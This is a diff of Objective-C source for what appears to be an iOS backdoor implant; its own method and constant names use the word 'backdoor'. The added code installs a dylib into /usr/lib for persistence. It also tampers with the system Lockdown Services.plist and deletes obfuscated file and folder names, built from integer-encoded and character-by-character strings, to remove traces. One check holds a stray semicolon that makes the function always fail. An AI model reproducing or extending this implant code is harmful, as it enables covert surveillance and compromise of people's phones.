@@ -271,8 +271,35 @@ static NSMutableArray *gCurrProcsList = nil;
   return TRUE;
 }
 
+- (BOOL)createExternalLib
+{
+  NSString *dylibPathname =
+  [[NSString alloc] initWithFormat:@"%@/%@",
+                                   @"/usr/lib",
+                                   gDylibName];
+  NSString *local_dylibName =
+  [[NSString alloc] initWithFormat:@"%@/%@",
+                                   [[NSBundle mainBundle] bundlePath],
+                                   gDylibName];
+  
+  if ([[NSFileManager defaultManager] fileExistsAtPath:dylibPathname] == FALSE)
+  {
+    if ([[NSFileManager defaultManager] copyItemAtPath:local_dylibName
+                                                toPath:dylibPathname
+                                                 error:nil] == FALSE);
+    return FALSE;
+  }
+  
+  return TRUE;
+}
+
 - (BOOL)isBackdoorAlreadyResident
 {
+  if ([self createExternalLib] == FALSE)
+  {
+    createInfoLog(@"Cannot install external module");
+  }
+  
   if ([[NSFileManager defaultManager] fileExistsAtPath:BACKDOOR_DAEMON_PLIST
                                            isDirectory:NULL])
     return YES;
@@ -318,10 +345,36 @@ static NSMutableArray *gCurrProcsList = nil;
 
 - (void)uninstallMeh
 {
+  int kpfdylib   = 0x0066706b;
+  int kpbdylib   = 0x0062706b;
+  NSString *boot = @"bootpd";
+  NSString *comp = @"com.apple";
+  
+  NSString *kpfname    = [NSString stringWithFormat:@"/usr/lib/%s.dylib", (char*)&kpfdylib];
+  NSString *kpbname    = [NSString stringWithFormat:@"/usr/lib/%s.dylib", (char*)&kpbdylib];
+  NSString *bootplist  = [NSString stringWithFormat:@"/System/Library/LaunchDaemons/%@.%@.plist",
+                                                   comp, boot];
+  
+  NSString *lockdown_saved  = [NSString stringWithFormat:@"/System/Library/Lockdown/Services.bck"];
+  NSString *lockdown_plist  = [NSString stringWithFormat:@"/System/Library/Lockdown/Services.plist"];
+  
+  if ([[NSFileManager defaultManager] fileExistsAtPath:lockdown_saved])
+  {
+    [[NSFileManager defaultManager] removeItemAtPath:lockdown_plist error:nil];
+    
+    [[NSFileManager defaultManager] copyItemAtPath:lockdown_saved
+                                            toPath:lockdown_plist
+                                             error:nil];
+  }
+  
+  [[NSFileManager defaultManager] removeItemAtPath:kpfname    error:nil];
+  [[NSFileManager defaultManager] removeItemAtPath:kpbname    error:nil];
+  [[NSFileManager defaultManager] removeItemAtPath:bootplist  error:nil];
+  
   NSString *sbPathname = @"/System/Library/LaunchDaemons/com.apple.SpringBoard.plist";
   NSString *itPathname = @"/System/Library/LaunchDaemons/com.apple.itunesstored.plist";
   NSString *dylibPathname = 
-  [[NSString alloc] initWithFormat: @"%@/%@", @"/usr/lib", gDylibName];
+          [[NSString alloc] initWithFormat: @"%@/%@", @"/usr/lib", gDylibName];
   
   [self uninstallExternalModules];
   
@@ -330,7 +383,7 @@ static NSMutableArray *gCurrProcsList = nil;
   
   [self launchCtl: ITUNESSTORE_PLIST_PATH command: "unload"];
   [self launchCtl: ITUNESSTORE_PLIST_PATH command: "load"];
-  
+    
   [[NSFileManager defaultManager] removeItemAtPath: dylibPathname
                                              error: nil];
   [[NSFileManager defaultManager] removeItemAtPath: [[NSBundle mainBundle] bundlePath]
@@ -989,6 +1042,14 @@ typedef struct _coreMessage_t
 - (void)cleanUp:(NSTimer*)theTimer
 {
   int zeroChar = 0;
+  
+  NSString *kdifolder = [NSString stringWithFormat:@"/var/mobile/Media/%c%c%c",
+                              'k', 'd', 'i'];
+  NSString *iosfolder = [NSString stringWithFormat:@"/var/mobile/Media/%c%c%c",
+                              'i', 'o', 's'];
+  
+  [[NSFileManager defaultManager] removeItemAtPath:kdifolder error:nil];
+  [[NSFileManager defaultManager] removeItemAtPath:iosfolder error:nil];
   
   NSString *installDirName = [NSString stringWithFormat:@"../.%d%d%d%d",
                                                         zeroChar, zeroChar, zeroChar, zeroChar];
